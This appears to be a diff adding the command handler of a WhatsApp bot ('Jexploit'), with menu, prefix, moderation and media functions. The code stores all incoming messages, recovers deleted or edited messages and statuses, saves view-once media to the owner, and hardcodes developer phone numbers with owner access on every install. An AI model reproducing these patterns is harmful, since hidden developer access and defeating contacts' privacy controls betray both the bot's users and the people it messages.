@@ -1,0 +1,11945 @@
+require('../config')
+const yts = require('yt-search')
+const fs = require('fs')
+const axios = require('axios')
+const googleTTS = require('google-tts-api')
+const checkDiskSpace = require('check-disk-space').default;
+const chalk = require("chalk")
+const fetch = require("node-fetch")
+const FormData = require('form-data')
+const jimp = require("jimp")
+const { fromBuffer } =  require('file-type')
+const cheerio = require('cheerio')
+const os = require('os')
+const fg = require('api-dylux')
+const ffmpeg = require('fluent-ffmpeg');
+const PDFDocument = require('pdfkit')
+const AdmZip = require('adm-zip')
+const path = require('path')
+const { getDevice } = require('@whiskeysockets/baileys')
+const fsp = fs.promises;
+const lolcatjs = require('lolcatjs')
+const { evaluate } = require('mathjs')
+const crypto = require('crypto')
+const speed = require('performance-now')
+const { performance } = require("perf_hooks")
+const { sendButton } = require('kango-wa');
+const more = String.fromCharCode(8206);
+const util = require("util")
+const timezones = global.timezones || "Africa/Kampala"; // Default to Uganda timezone
+const moment = require("moment-timezone")
+const { spawn, exec, execSync } = require('child_process')
+const { default: baileys, proto, jidNormalizedUser, generateWAMessage, generateWAMessageFromContent,
+generateWAMessageContent, getContentType, downloadContentFromMessage,prepareWAMessageMedia } = require("@whiskeysockets/baileys")
+
+const { 
+  smsg, 
+  sendGmail, 
+  formatSize, 
+  isUrl, 
+  generateMessageTag, 
+  CheckBandwidth, 
+  getBuffer, 
+  getGroupAdmins, 
+  getSizeMedia, 
+  runtime, 
+  fetchJson, 
+  sleep, 
+  getRandom 
+} = require('./lib/myfunction')
+
+const { obfuscateJS } = require("./lib/encapsulation");
+const db = require('./Core/databaseManager');
+const GroupDB = require('./Metadata/group');
+const { handleMediaUpload } = require('./lib/catbox');
+const { styletext, fetchMp3, fetchVideo } = require('./lib/scraper')
+const { 
+    setAwesomeMenu,
+    resetMenu,
+    sendMenu,
+    detectPlatform,
+    showCurrentMenu, 
+    loadMenuConfig 
+} = require('./DevKelvin/menu');
+const {
+ fetchMp3DownloadUrl,
+ fetchVideoDownloadUrl,
+ downloadVerifiedMedia,
+  saveStatusMessage,
+  acr,
+  handleAntiEdit,
+  loadStoredMessages,
+  saveStoredMessages,
+  storeMessage,
+  ephoto,
+  getServerUptime,
+  getServerStartTime,
+  loadBlacklist,
+  disapproveAllRequests,
+  approveAllRequests,
+  listGroupRequests,
+  handleAntiTag,
+  handleAntiTagAdmin,
+  handleLinkViolation,
+  checkAndHandleLinks,
+  handleBadword,
+  handleAntisticker,
+  detectUrls,
+  normalizeJid,
+  delay,
+  recordError,
+  shouldLogError } = require('../Jex')
+  
+
+const {  takeCommand, ytplayCommand, playCommand } = require('./KelvinCmds/commands')
+
+const {
+veniceAICommand,
+mistralAICommand,
+perplexityAICommand,
+bardAICommand,
+gpt4NanoAICommand,
+kelvinAICommand,
+claudeAICommand
+} = require('./KelvinCmds/ai');
+const { playCommand2 } = require('./KelvinCmds/video');
+const { dareCommand, truthCommand } = require('./KelvinCmds/fun');
+const sports = require('./KelvinCmds/sport');
+const { handleAutoReact } = require('./KelvinCmds/autoreact');
+const { handleAutoRead } = require('./KelvinCmds/autoread');
+const { handleAutoTyping } = require('./KelvinCmds/autotyping');
+const { handleAIChatbot } = require('./KelvinCmds/chatbot');
+const { handleAutoRecording } = require('./KelvinCmds/autorecord');
+const { handleAntiDelete } = require('./KelvinCmds/antidelete');
+const { handleReplyForward, handleAntiViewOnce, handleSaveMediaCommand } = require('./KelvinCmds/savemedia');
+const { cleaningSession } = require('./lib/botSession'); 
+const {fetchReactionImage} = require('./lib/reaction')
+const { toAudio } = require('./lib/converter');
+const { webp2mp4 } = require('./lib/uploader');
+const { ButtonHandler } = require('./lib/buttonHandler');
+const { encryptCommand } = require('./utility/encrypt');
+const { handleDemote } = require('./utility/antidemote');
+const { handlePromote } = require('./utility/antipromote');
+const { sendPTT } = require('./utility/kevptt');
+
+
+module.exports = conn = async (conn, m, chatUpdate, mek, store) => {
+try {
+const body = (m.mtype === "conversation" ? m.message.conversation : m.mtype === "imageMessage" ? m.message.imageMessage.caption : m.mtype === "videoMessage" ? m.message.videoMessage.caption : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId : m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "")
+const budy = (typeof m.text === 'string' ? m.text : '')
+var textmessage = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || budy) : ""
+const content = JSON.stringify(mek.message)
+const type = Object.keys(mek.message)[0]
+if (m.message && m.key && !m.key.fromMe) {
+    storeMessage(m.chat, m.key.id, {
+        key: m.key,
+        message: m.message,
+        messageTimestamp: m.messageTimestamp,
+        pushName: m.pushName || "Unknown"
+    });
+}
+
+let buttonHandler = null;
+if (!global.buttonHandler) {
+    buttonHandler = new ButtonHandler(conn);
+    global.buttonHandler = buttonHandler;
+} else {
+    buttonHandler = global.buttonHandler;
+}
+
+const botNumber = await conn.decodeJid(conn.user.id);
+const { sender } = m;
+const from = m.key.remoteJid;
+const chatId = m.chat;
+const groupJid = m.chat;
+const isGroup = from.endsWith("@g.us");
+const senderId = m.key.participant || from;  
+const DEV_JIDS = [
+    '256742932677@s.whatsapp.net',
+    '256755585369@s.whatsapp.net',
+    '38161203904689@lid',
+    '96491339264216@lid'
+];
+
+const LegendaryKevin = JSON.parse(fs.readFileSync('./data/owner.json'));
+const ownerFile = './data/owner.json';
+const ownerList = LegendaryKevin.owner || [];
+
+const authorizedJids = [
+    ...DEV_JIDS,
+    ...ownerList,
+    botNumber
+];
+
+// m.isOwner is resolved once, centrally, in start/lib/lidResolver.js
+// (enrichMessage) before kevin.js runs. It also matches global.owner /
+// global.sudo and correctly recognizes an owner even when WhatsApp
+// addresses them via an opaque @lid instead of their real number, so it's
+// preferred over the plain authorizedJids.includes(m.sender) check above.
+const Access = m.isOwner === true || authorizedJids.includes(m.sender);
+
+let prefix = ".";
+
+try {
+    prefix = await db.get(botNumber, 'prefix', '.');
+} catch (error) {
+    console.error('Error loading prefix from database:', error);
+    prefix = "."; 
+}
+
+try {
+    const alwaysonlineSetting = await db.get(botNumber, 'alwaysonline', false);
+    if (typeof alwaysonlineSetting === 'boolean') {
+        global.alwaysonline = alwaysonlineSetting;
+    } else if (typeof alwaysonlineSetting === 'string') {
+        global.alwaysonline = alwaysonlineSetting.toLowerCase() === 'true';
+    } else {
+        global.alwaysonline = false; 
+    }
+} catch (error) {
+    console.error('Error loading alwaysonline from database:', error);
+    global.alwaysonline = false; 
+}
+
+
+const isCmd = body?.startsWith?.(prefix);
+const trimmedBody = isCmd ? body.slice(prefix.length).trimStart() : "";
+const command = isCmd ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : "";
+const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : [];
+const pushname = m.pushName || "No Name";
+const text = q = args.join(" ")
+const fatkuns = m.quoted || m;
+const quoted = fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] : fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m;
+const qmsg = quoted.msg || quoted;
+const mime = qmsg.mimetype || '';
+const isImage = type === 'imageMessage';
+const isVideo = type === 'videoMessage';
+const isAudio = type === 'audioMessage';
+const isMedia = /image|video|sticker|audio/.test(mime)
+const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
+const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
+const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
+const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
+const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
+const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
+const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
+const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
+
+let groupMetadata = null;
+let groupName = "";
+let participants = [];
+
+if (isGroup) {
+    try {
+        groupMetadata = await conn.groupMetadata(from);
+        groupName = groupMetadata.subject || "";
+        participants = groupMetadata.participants || [];
+    } catch (err) {
+        console.log('[GROUP METADATA ERROR]', err.message);
+    }
+}
+
+const peler = fs.readFileSync('./start/lib/Media/Jexploit.jpg')
+const cina = fs.readFileSync('./start/lib/Media/Jex.jpg')
+function getRandomImage() {
+const randomIndex = Math.floor(Math.random() * cina.length)
+return cina[randomIndex]
+}
+const cinahitam = getRandomImage()
+async function pickRandom(list) {
+return list[Math.floor(Math.random() * list.length)]
+}
+const Usage = prefix + command
+const more = String.fromCharCode(8206)
+const readmore = more.repeat(4001)
+const reaction = async (jidss, emoji) => {
+conn.sendMessage(jidss, { react: { text: emoji, key: m.key } })
+}
+
+//  functions that help in togstatus
+async function buildPayloadFromQuoted(quotedMessage, conn) {
+    if (quotedMessage.videoMessage) {
+        const buffer = await downloadToBuffer(quotedMessage.videoMessage, 'video');
+        return { 
+            video: buffer, 
+            caption: quotedMessage.videoMessage.caption || '',
+            gifPlayback: quotedMessage.videoMessage.gifPlayback || false,
+            mimetype: quotedMessage.videoMessage.mimetype || 'video/mp4'
+        };
+    } else if (quotedMessage.imageMessage) {
+        const buffer = await downloadToBuffer(quotedMessage.imageMessage, 'image');
+        return { 
+            image: buffer, 
+            caption: quotedMessage.imageMessage.caption || '',
+            mimetype: quotedMessage.imageMessage.mimetype || 'image/jpeg'
+        };
+    } else if (quotedMessage.audioMessage) {
+        const buffer = await downloadToBuffer(quotedMessage.audioMessage, 'audio');
+        if (quotedMessage.audioMessage.ptt) {
+            const audioVn = await toVN(buffer);
+            return { audio: audioVn, mimetype: "audio/ogg; codecs=opus", ptt: true };
+        } else {
+            return { audio: buffer, mimetype: quotedMessage.audioMessage.mimetype || 'audio/mpeg', ptt: false };
+        }
+    } else if (quotedMessage.stickerMessage) {
+        try {
+            const buffer = await downloadToBuffer(quotedMessage.stickerMessage, 'sticker');
+            const imageBuffer = await convertStickerToImage(buffer, quotedMessage.stickerMessage.mimetype);
+            return { 
+                image: imageBuffer, 
+                caption: quotedMessage.stickerMessage.caption || '',
+                mimetype: 'image/png',
+                convertedSticker: true,
+                originalMimetype: quotedMessage.stickerMessage.mimetype
+            };
+        } catch (conversionError) {
+            console.error('Sticker conversion failed:', conversionError);
+            return { text: `⚠️ Sticker conversion failed (${quotedMessage.stickerMessage.mimetype || 'unknown'})` };
+        }
+    } else if (quotedMessage.conversation || quotedMessage.extendedTextMessage?.text) {
+        const textContent = quotedMessage.conversation || quotedMessage.extendedTextMessage?.text || '';
+        return { text: textContent };
+    }
+    return null;
+}
+
+async function downloadToBuffer(message, type) {
+    const stream = await downloadContentFromMessage(message, type);
+    let buffer = Buffer.from([]);
+    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
+    return buffer;
+}
+
+async function convertStickerToImage(stickerBuffer, mimetype = 'image/webp') {
+    try {
+        return await convertStickerToImageSimple(stickerBuffer);
+    } catch (error) {
+        console.error('Sticker conversion failed:', error);
+        throw new Error(`Sticker conversion failed: ${error.message}`);
+    }
+}
+
+async function convertStickerToImageSimple(stickerBuffer) {
+    if (stickerBuffer.slice(0, 12).toString('hex').includes('52494646')) { // RIFF header
+        console.log('Detected WebP sticker, using fallback conversion');
+        return stickerBuffer; 
+    }
+    return stickerBuffer;
+}
+
+async function toVN(inputBuffer) {
+    return new Promise((resolve, reject) => {
+        const inStream = new PassThrough();
+        inStream.end(inputBuffer);
+        const outStream = new PassThrough();
+        const chunks = [];
+        ffmpeg(inStream)
+            .noVideo()
+            .audioCodec("libopus")
+            .format("ogg")
+            .audioBitrate("48k")
+            .audioChannels(1)
+            .audioFrequency(48000)
+            .on("error", reject)
+            .on("end", () => resolve(Buffer.concat(chunks)))
+            .pipe(outStream, { end: true });
+        outStream.on("data", chunk => chunks.push(chunk));
+    });
+}
+
+async function sendGroupStatus(conn, jid, content) {
+    const inside = await generateWAMessageContent(content, { upload: conn.waUploadToServer });
+    const messageSecret = crypto.randomBytes(32);
+    const m = generateWAMessageFromContent(jid, {
+        messageContextInfo: { messageSecret },
+        groupStatusMessageV2: { message: { ...inside, messageContextInfo: { messageSecret } } }
+    }, {});
+    await conn.relayMessage(jid, m.message, { messageId: m.key.id });
+    return m;
+}
+
+function detectMediaType(quotedMessage, payload = null) {
+    if (!quotedMessage) return 'Text';
+    if (quotedMessage.videoMessage) return 'Video';
+    if (quotedMessage.imageMessage) return 'Image';
+    if (quotedMessage.audioMessage) return 'Audio';
+    if (quotedMessage.stickerMessage) {
+        if (payload && payload.convertedSticker) return 'Sticker → Image';
+        return 'Sticker';
+    }
+    return 'Text';
+}
+
+function getHelpText() {
+    return `
+✦ *GROUP STATUS* ✦
+
+Commands:
+✦ togroupstatus / .tosgroup
+
+Usage:
+✦ tosgroup text
+✦ Reply to media/sticker with .tosgroup
+✦ Add caption after command`;
+}
+
+  // Function to check bandwidth (download/upload)
+  async function checkBandwidth() {
+    // This is a simplified implementation
+    // For more accurate results, you might want to use a dedicated library
+    return {
+      download: 'N/A', // You can implement actual measurement here
+      upload: 'N/A'    // You can implement actual measurement here
+    };
+  }
+
+// Validate connection object
+function isValidConn(conn) {
+    return conn && 
+           typeof conn === 'object' && 
+           typeof conn.sendMessage === 'function' &&
+           typeof conn.decodeJid === 'function' &&
+           conn.user && 
+           conn.user.id;
+}
+
+// Helper for PTV command
+function getTempDir() {
+    const tempDir = path.join(__dirname, '../temp');
+    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
+    return tempDir;
+}
+
+function deleteTempFile(filePath) {
+    try {
+        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
+    } catch (e) {}
+}
+
+function probeDuration(filePath) {
+    return new Promise((resolve, reject) => {
+        ffmpeg.ffprobe(filePath, (err, metadata) => {
+            if (err) return reject(err);
+            resolve(metadata.format.duration || 0);
+        });
+    });
+}
+// Convert video to video note using fluent-ffmpeg
+function convertToVideoNote(inputPath, outputPath, maxDuration = 60, size = 480) {
+    return new Promise((resolve, reject) => {
+        // First check if input file exists
+        if (!fs.existsSync(inputPath)) {
+            return reject(new Error('Input file not found'));
+        }
+
+        // Get duration first
+        ffmpeg.ffprobe(inputPath, (err, metadata) => {
+            if (err) {
+                return reject(new Error(`FFprobe failed: ${err.message}`));
+            }
+
+            const duration = metadata.format.duration || 0;
+            
+            // Create ffmpeg command
+            const command = ffmpeg(inputPath);
+            
+            // Trim if duration exceeds maxDuration
+            if (duration > maxDuration) {
+                command.duration(maxDuration);
+            }
+            
+            // Video filter: scale and crop to square
+            const vfilter = `scale=${size}:${size}:force_original_aspect_ratio=increase,crop=${size}:${size}`;
+            
+            command
+                .videoFilter(vfilter)
+                .videoCodec('libx264')
+                .outputOptions([
+                    '-preset', 'veryfast',
+                    '-crf', '28',
+                    '-pix_fmt', 'yuv420p',
+                    '-r', '30'
+                ])
+                .audioCodec('aac')
+                .audioBitrate('96k')
+                .audioChannels(2)
+                .audioFrequency(44100)
+                .outputOptions('-movflags +faststart')
+                .format('mp4')
+                .on('end', () => {
+                    if (fs.existsSync(outputPath) && fs.statSync(outputPath).size > 0) {
+                        resolve();
+                    } else {
+                        reject(new Error('Output file is empty or missing'));
+                    }
+                })
+                .on('error', (err) => {
+                    reject(new Error(`FFmpeg error: ${err.message}`));
+                })
+                .save(outputPath);
+        });
+    });
+}
+
+const worldcupAudios = [
+    'https://files.catbox.moe/5ev63c.mp3',
+    'https://files.catbox.moe/om7dpc.mp3',
+    'https://files.catbox.moe/2375tg.mp3',
+];
+
+// Cache to store last selected index
+let lastIndex = -1;
+
+function getRandomAudio() {
+    // Get random index different from last one
+    let newIndex;
+    do {
+        newIndex = Math.floor(Math.random() * worldcupAudios.length);
+    } while (newIndex === lastIndex && worldcupAudios.length > 1);
+    
+    lastIndex = newIndex;
+    const selected = worldcupAudios[newIndex];
+    
+    // Verify file exists before returning
+    if (!fs.existsSync(selected)) {
+        console.warn(`⚠️ Audio file missing: ${selected}`);
+        // Return first available as fallback
+        return worldcupAudios[0];
+    }
+    
+    console.log(`🎵 Playing: ${selected.split('/').pop()}`);
+    return selected;
+}
+
+//================== [ CONSOLE LOG] ==================//
+const dayz = moment(Date.now()).tz(`${timezones}`).locale('en').format('dddd');
+const timez = moment(Date.now()).tz(`${timezones}`).locale('en').format('HH:mm:ss z');
+const datez = moment(Date.now()).tz(`${timezones}`).format("DD/MM/YYYY");
+
+if (m.message) {
+  lolcatjs.fromString(`┏━━━━━━━━━━━━━『  JEXPLOIT  』━━━━━━━━━━━━━─`);
+  lolcatjs.fromString(`»  Sent Time: ${dayz}, ${timez}`);
+  lolcatjs.fromString(`»  Message Type: ${m.mtype || 'N/A'}`);
+  lolcatjs.fromString(`»  Sender Name: ${pushname || 'N/A'}`);
+  lolcatjs.fromString(`»  Chat ID: ${m.chat?.split('@')[0] || 'N/A'}`);
+  lolcatjs.fromString(`»  Message: ${budy || 'N/A'}`);
+  lolcatjs.fromString('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─ ⳹\n\n');
+}
+//<================================================>//
+        conn.sendPresenceUpdate('unavailable', from)
+              
+let resize = async (image, width, height) => {
+let oyy = await jimp.read(image)
+let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
+return kiyomasa
+}
+
+const reply = (teks) => {
+    const safeText = teks || ''; 
+    conn.sendMessage(m.chat, {
+        text: safeText,
+        mentions: [sender],
+        contextInfo: {
+            jpegThumbnail: peler 
+        }
+    }, { quoted: m })
+}
+
+await handleAutoRecording(m, conn, botNumber);
+await handleAutoRead(m, conn, botNumber);
+await handleAutoTyping(m, conn, botNumber);
+await handleAutoReact(m, conn, botNumber);
+await handleAIChatbot(m, conn, body, from, isGroup, botNumber, isCmd, prefix);
+
+
+if (global.alwaysonline === true || global.alwaysonline === 'true') {
+    if (m.message && !m.key.fromMe) {
+        try {
+            await conn.sendPresenceUpdate("available", from);
+            await delay(1000); // 1-second delay
+        } catch (error) {
+            // Silently handle error - don't spam console
+        }
+    }
+} else {
+    // Default behavior - send unavailable presence
+    if (m.message && !m.key.fromMe) {
+        try {
+            await conn.sendPresenceUpdate("unavailable", from);
+            await delay(1000); // 1-second delay
+        } catch (error) {
+            // Silently handle error
+        }
+    }
+}
+
+if (m.isGroup && body && !m.key.fromMe) {
+    
+    await handleLinkViolation(conn, m, {
+        key: m.key,
+        message: m.message
+    }, botNumber);
+}
+
+// ANTI GROUP MENTION
+if ((m.mtype || '').includes("groupStatusMentionMessage") && m.isGroup) {
+    const antiGroupMention = await db.get(botNumber, 'antigroupmention', false);
+    
+    if (antiGroupMention) {
+        // Don't delete bot's own messages
+        if (m.key.fromMe) return;
+        if (m.isAdmin) return;
+        await conn.deleteMessage(m.chat, m.key).catch(() => {});
+        console.log(`[ANTI GROUP MENTION] Deleted group mention from ${m.sender}`);
+    }
+}
+
+// ========== ANTI-DELETE EXECUTION ==========
+if (m.message?.protocolMessage?.type === 0 && m.message?.protocolMessage?.key) {
+    await handleAntiDelete(m, conn, from, isGroup, botNumber);
+}
+
+
+
+
+// ========== ANTI-EDIT EXECUTION ==========
+if (m.message?.protocolMessage?.editedMessage) {
+    await handleAntiEdit(m, conn);
+}
+
+
+if (m.isGroup && body) {
+    await handleAntiTag(conn, m, botNumber);
+}
+
+if (m.isGroup && body) {
+    await handleAntiTagAdmin(conn, {
+        chat: m.chat,
+        sender: m.sender,
+        message: m.message,
+        key: m.key,
+        isGroup: true,
+        pushName: m.pushName || ''
+    });
+}
+
+if (m.isGroup && body) {
+    await handleAntiTagAdmin(conn, {
+        chat: m.chat,
+        sender: m.sender,
+        message: m.message,
+        key: m.key,
+        isGroup: true,
+        pushName: m.pushName || ''
+    });
+}
+if (m.isGroup && body && !m.key.fromMe) {
+    await handleBadword(conn, m, botNumber);
+}
+
+if (m.isGroup && !m.key.fromMe) {
+    await handleAntisticker(conn, m, botNumber);
+}
+
+if (m.isGroup && !m.key.fromMe && body && body.trim().length > 0) {
+    try {
+        await GroupDB.addMessage(from, sender); 
+    } catch (error) {
+        console.error('Error tracking user activity:', error.message);
+    }
+}
+
+// Reply to a Status / View-Once (no command) -> saved to the owner's DM, antidelete style
+await handleReplyForward(conn, m, { Access, body, isCmd, botNumber });
+
+// Auto-save incoming View-Once to the owner's DM (antiviewonce on/off)
+await handleAntiViewOnce(conn, m, botNumber);
+
+switch (command) {
+case 'menu':
+case 'Rober':
+case 'kevin':
+case 'jex': {
+    // Send loading message first
+    const loadingMsg = await conn.sendMessage(m.chat, { 
+        text: '*Loading menu...*' 
+    }, { quoted: m });
+
+    try {
+        await sendMenu(conn, m, prefix, global);
+        
+    } catch (error) {
+        console.error('Error in menu command:', error);
+        await conn.sendMessage(m.chat, {
+            text: '❌ Error displaying menu. Please try again!'
+        });
+    }
+    break;
+}
+case 'showmenu':
+case 'currentmenu': {
+    await showCurrentMenu(conn, m);
+    break;
+}
+case 'setawesomemenu': {
+    try {
+        
+        // Check if user is owner/admin
+        if (!Access) {
+            return reply(mess.owner);
+        }
+        
+        await setAwesomeMenu(conn, m);
+        
+        // Send success reaction
+        await conn.sendMessage(m.chat, { react: { text: "✨", key: m.key } });
+        
+    } catch (error) {
+        console.error('Error in setawesomemenu:', error);
+        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
+        reply('❌ Failed to set awesome menu format!');
+    }
+}
+break
+case 'resetawesomemenu': {
+    try {
+        if (!Access) {
+            return reply(mess.owner);
+        }
+        
+        await resetMenu(conn, m);
+        
+        // Send success reaction
+        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
+        
+    } catch (error) {
+        console.error('Error in resetmenu:', error);
+        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
+        reply('❌ Failed to reset menu format!');
+    }
+}
+case "setmenu":
+case "menustyle": {
+    if (!Access) return reply(mess.owner);
+    
+    const style = args[0]?.toLowerCase();
+    
+    if (!style || !['1', '2'].includes(style)) {
+        return reply(`*🎨 MENU STYLE*\n\n${prefix}setmenu 1 - Button style menu (NO image)\n${prefix}setmenu 2 - Image + Buttons menu\n\nCurrent: ${global.menuStyle === 'image' ? 'Image + Buttons' : 'Button only'}`);
+    }
+    
+    if (style === '1') {
+        await db.set(botNumber, 'menustyle', 'button');
+        global.menuStyle = 'button';
+        reply(`✅ *Menu set to BUTTON ONLY MODE*`);
+    } else if (style === '2') {
+        await db.set(botNumber, 'menustyle', 'image');
+        global.menuStyle = 'image';
+        reply(`✅ *Menu set to IMAGE + BUTTONS MODE*`);
+    }
+    
+}
+break
+case 'antiedit': {
+    if (!Access) return reply(mess.owner);
+    
+    const mode = args[0]?.toLowerCase();
+    
+    if (mode === 'group') {
+        const groupMode = args[1]?.toLowerCase();
+        if (groupMode === 'on') {
+            await db.set(botNumber, 'antiedit_group', true);
+            console.log(`[ANTIEDIT SET] botNumber=${botNumber} antiedit_group=true`);
+            return reply('✅*Successfully enabled antiedit for groups - edited messages will now be recovered and reposted in the group they were edited in*');
+        }
+        if (groupMode === 'off') {
+            await db.set(botNumber, 'antiedit_group', false);
+            console.log(`[ANTIEDIT SET] botNumber=${botNumber} antiedit_group=false`);
+            return reply('✅*Successfully disabled antiedit for groups - edited messages will no longer be recovered in groups*');
+        }
+        return reply(`❌ Invalid option! Use: ${prefix}antiedit group on OR ${prefix}antiedit group off`);
+    }
+    
+    // Show help if no arguments
+    if (!mode) {
+        const currentMode = await db.get(botNumber, 'antiedit', 'off');
+        const groupEnabled = await db.get(botNumber, 'antiedit_group', false);
+        return reply(`*ANTI-EDIT SETTINGS*
+
+Private chats mode: ${currentMode}
+Groups: ${groupEnabled ? 'on' : 'off'}
+
+📌 *Commands:*
+• ${prefix}antiedit on - Enable (chat mode)
+• ${prefix}antiedit off - Disable
+• ${prefix}antiedit chat - Set to chat mode
+• ${prefix}antiedit private - Set to private mode
+• ${prefix}antiedit group on - Enable recovery in groups
+• ${prefix}antiedit group off - Disable recovery in groups`);
+    }
+    
+    // Handle on/off
+    if (mode === 'on') {
+        await db.set(botNumber, 'antiedit', 'chat');
+        return reply(`✅*Successfully enabled antiedit chat mode*`);
+    }
+    
+    if (mode === 'off') {
+        await db.set(botNumber, 'antiedit', 'off');
+        return reply(`✅*Successfully disabled antiedit*`);
+    }
+    
+    // Handle mode settings
+    if (mode === 'chat') {
+        await db.set(botNumber, 'antiedit', 'chat');
+        return reply(`✅*Successfully enabled antiedit chat mode*`);
+    }
+    
+    if (mode === 'private') {
+        await db.set(botNumber, 'antiedit', 'private');
+        return reply(`✅*Successfully enabled antiedit private mode*`);
+    }
+    
+    reply('❌ Invalid option! Use: on, off, chat, private, group on, group off');
+    break;
+}
+case 'antidelete': {
+    if (!Access) return reply(mess.owner);
+    
+    const mode = args[0]?.toLowerCase();
+
+    // .antidelete group on / .antidelete group off - bot-wide switch for
+    // whether deleted media gets recovered inside groups. Works from
+    // anywhere (inbox or a group) since it is a plain bot-wide flag, not
+    // tied to any specific chat.
+    if (mode === 'group') {
+        const groupMode = args[1]?.toLowerCase();
+        if (groupMode === 'on') {
+            await db.set(botNumber, 'antidelete_group', true);
+            console.log(`[ANTIDELETE SET] botNumber=${botNumber} antidelete_group=true`);
+            return reply('✅*Successfully enabled antidelete for groups - deleted media will now be recovered and reposted in the group it was deleted from*');
+        }
+        if (groupMode === 'off') {
+            await db.set(botNumber, 'antidelete_group', false);
+            console.log(`[ANTIDELETE SET] botNumber=${botNumber} antidelete_group=false`);
+            return reply('✅*Successfully disabled antidelete for groups - deleted media will no longer be recovered in groups*');
+        }
+        return reply(`❌ Invalid option! Use: ${prefix}antidelete group on OR ${prefix}antidelete group off`);
+    }
+    
+    if (!mode) {
+        const currentMode = await db.get(botNumber, 'antidelete', 'off');
+        const groupEnabled = await db.get(botNumber, 'antidelete_group', false);
+        
+        return reply(`*ANTI-DELETE SETTINGS*
+
+Private chats mode: ${currentMode}
+Groups: ${groupEnabled ? 'on' : 'off'}
+
+📌 *Commands:*
+• ${prefix}antidelete on - Enable (chat mode)
+• ${prefix}antidelete off - Disable
+• ${prefix}antidelete chat - Set to chat mode
+• ${prefix}antidelete private - Set to private mode
+• ${prefix}antidelete status - Show settings
+• ${prefix}antidelete group on - Enable recovery in groups
+• ${prefix}antidelete group off - Disable recovery in groups`);
+    }
+    
+    // Handle on/off
+    if (mode === 'on') {
+        await db.set(botNumber, 'antidelete', 'chat');
+        return reply(`✅*Successfully enabled antidelete chat mode*`);
+    }
+    
+    if (mode === 'off') {
+        await db.set(botNumber, 'antidelete', 'off');
+        return reply(`✅*Successfully disabled antidelete*`);
+    }
+    
+    // Handle mode settings
+    if (mode === 'chat') {
+        await db.set(botNumber, 'antidelete', 'chat');
+        return reply(`✅*Successfully enabled antidelete chat mode*`);
+    }
+    
+    if (mode === 'private') {
+        await db.set(botNumber, 'antidelete', 'private');
+        return reply(`✅*Successfully enabled antidelete private mode*`);
+    }
+    
+    // Handle status
+    if (mode === 'status') {
+        const currentMode = await db.get(botNumber, 'antidelete', 'off');
+        const groupEnabled = await db.get(botNumber, 'antidelete_group', false);
+        return reply(`*ANTI-DELETE STATUS*
+
+Private chats mode: ${currentMode}
+Private chats status: ${currentMode !== 'off' ? '✅ Enabled' : '❌ Disabled'}
+Groups status: ${groupEnabled ? '✅ Enabled' : '❌ Disabled'}
+
+📌 *Modes:*
+• chat - Alerts sent to same chat
+• private - Alerts sent to bot owner inbox`);
+    }
+    
+    reply('❌ Invalid option! Use: on, off, chat, private, status, group on, group off');
+    break;
+}
+case 'antideletestatus': {
+    if (!Access) return reply(mess.owner);
+
+    const mode = args[0]?.toLowerCase();
+
+    if (!mode) {
+        const currentMode = await db.get(botNumber, 'antideletestatus', false);
+        return reply(`*ANTIDELETE-STATUS SETTINGS*
+
+Current Status: ${currentMode ? '✅ Enabled' : '❌ Disabled'}
+
+📌 *Commands:*
+• ${prefix}antideletestatus on - Enable
+• ${prefix}antideletestatus off - Disable
+
+When enabled, a WhatsApp status someone deletes early is recovered and sent to *your own inbox only*, along with who posted it.`);
+    }
+
+    if (mode === 'on') {
+        await db.set(botNumber, 'antideletestatus', true);
+        return reply(`✅ *Successfully enabled antideletestatus*`);
+    }
+
+    if (mode === 'off') {
+        await db.set(botNumber, 'antideletestatus', false);
+        return reply(`✅ *Successfully disabled antideletestatus*`);
+    }
+
+    reply('❌ Invalid option! Use: on, off');
+    break;
+}
+case 'setprefix':
+case 'prefix': {
+    if (!Access) return reply(mess.owner);
+    
+    const newPrefix = args[0];
+    if (!newPrefix) {
+        const currentPrefix = await db.get(botNumber, 'prefix', '.');
+        return reply(`*PREFIX SETTINGS*\n\nCurrent prefix: *${currentPrefix === '' ? 'none' : currentPrefix}*\n\nUsage: ${currentPrefix === '' ? '' : currentPrefix}setprefix <new prefix>\nUse *${currentPrefix === '' ? '' : currentPrefix}setprefix none* to remove the prefix.`);
+    }
+    
+    // Handle 'none' to remove prefix
